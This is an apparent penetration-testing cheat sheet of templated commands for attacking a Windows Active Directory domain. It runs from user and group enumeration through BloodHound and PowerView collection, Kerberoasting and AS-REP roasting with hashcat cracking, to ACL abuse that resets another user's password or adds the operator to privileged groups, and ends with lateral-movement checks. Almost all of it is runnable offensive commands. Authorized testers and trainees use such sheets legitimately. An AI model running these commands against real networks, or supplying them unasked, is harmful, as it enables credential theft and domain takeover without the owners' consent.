# === PHASE 1: BASIC DOMAIN CONTEXT ===
# Standard Windows enum still applies - run windows_enum first
whoami /all
systeminfo | findstr /B /C:"Domain" /C:"Logon Server"
# Domain users and groups
net user /domain
net user {{USER}} /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
# Check for GPP passwords - SYSVOL often readable by all domain users
net view \\{{DC_IP}} /all
dir \\{{DC_HOSTNAME}}.{{DOMAIN}}\SYSVOL

# === PHASE 2: BLOODHOUND COLLECTION ===
# Preferred - visualises all attack paths automatically
# Transfer SharpHound to target first (use RDP drive mapping where possible)
xfreerdp3 /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
# Run collection (All = comprehensive, takes longer)
.\SharpHound.exe -c All
.\SharpHound.exe -c Default
# Transfer zip back to Kali then load into BloodHound
# On Kali: sudo neo4j start && bloodhound

# === PHASE 3: POWERVIEW ENUMERATION ===
# Use when BloodHound is blocked or data exfil is painful
Import-Module .\PowerView.ps1
# Domain overview
Get-NetDomain
Get-NetDomainController
# Users - look for recently set passwords, old lastlogon
Get-NetUser | select cn,pwdlastset,lastlogon,description
# Look for passwords in description fields
Get-NetUser | Where-Object {$_.description -ne $null} | Select name,description
# Groups and members
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
# Computers
Get-NetComputer | select dnshostname,operatingsystem
# Shares - look for non-default shares with interesting content
Find-DomainShare
# GPP passwords - decrypt with gpp-decrypt on Kali
ls \\{{DC_HOSTNAME}}.{{DOMAIN}}\SYSVOL

# === PHASE 4: SPN / KERBEROAST ENUMERATION ===
# Identify kerberoastable accounts - SPNs bound to user accounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname
setspn -L {{SERVICE_ACCOUNT}}
# Resolve SPN hostnames to IPs
nslookup {{SPN_HOST}}.{{DOMAIN}}
# Kerberoast all SPNs (request TGS tickets, extract for offline cracking)
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
impacket-GetUserSPNs -dc-ip {{DC_IP}} -outputfile kerb_hashes.txt {{DOMAIN}}/{{USER}}:{{PASS}}
# Crack on Kali
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# === PHASE 5: AS-REP ROASTING ===
# Accounts with pre-auth disabled - request AS-REP without credentials
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
impacket-GetNPUsers -dc-ip {{DC_IP}} -request -usersfile users.txt {{DOMAIN}}
# Crack on Kali
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# === PHASE 6: ACL / OBJECT PERMISSION ABUSE ===
# Check what permissions other users have over current account
Get-ObjectAcl -Identity {{USER}}
# Convert SIDs to names
Convert-SidToName {{SID}}
# Find GenericAll / WriteDACL / GenericWrite on any object - direct takeover path
Get-ObjectAcl -Identity "Domain Admins" | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select SecurityIdentifier,ActiveDirectoryRights
"{{SID1}}","{{SID2}}" | Convert-SidToName
# If GenericAll over a user - reset their password
net user {{TARGET_USER}} NewP@ss123 /domain
# If GenericAll over a group - add yourself
net group "{{TARGET_GROUP}}" {{USER}} /add /domain

# === PHASE 7: LATERAL MOVEMENT PREP ===
# Where do we have local admin rights
Find-LocalAdminAccess
# Who is logged in where (often blocked by modern permissions)
Get-NetSession -ComputerName {{TARGET_HOST}} -Verbose
# PsLoggedon - requires RemoteRegistry (enabled on servers by default)
.\PsLoggedon.exe \\{{TARGET_HOST}}
# Test connectivity to other hosts
Test-NetConnection {{TARGET_HOST}} -Port 445
Test-NetConnection {{DC_IP}} -Port 445
